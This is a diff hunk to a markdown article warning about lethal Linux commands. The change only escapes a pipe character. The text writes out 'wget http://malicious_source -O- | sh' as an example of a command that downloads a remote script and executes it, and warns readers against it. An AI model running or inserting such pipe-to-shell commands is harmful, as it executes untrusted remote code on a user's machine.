@@ -94,6 +94,6 @@ Here’s an innocent command that can actually be useful in day-to-day life on a
 > wget http://an-untrusted-url -O- \| sh
  
 
-**wget http://malicious_source -O- | sh** command will download a script from a malicious source and then execute it. Wget command will download the script and sh will execute the downloaded script.The above combination downloads the contents of the given URL and immediately feeds it to the **sh** command, which executes the downloaded contents in the terminal. If the URL were to point to a malicious script, you’d be sealing your own fate with this command.
+**wget http://malicious_source -O- \| sh** command will download a script from a malicious source and then execute it. Wget command will download the script and sh will execute the downloaded script.The above combination downloads the contents of the given URL and immediately feeds it to the **sh** command, which executes the downloaded contents in the terminal. If the URL were to point to a malicious script, you’d be sealing your own fate with this command.
 
 Font [TechWorm](http://www.techworm.net/2016/10/10-lethal-linux-commands-never-execute.html)
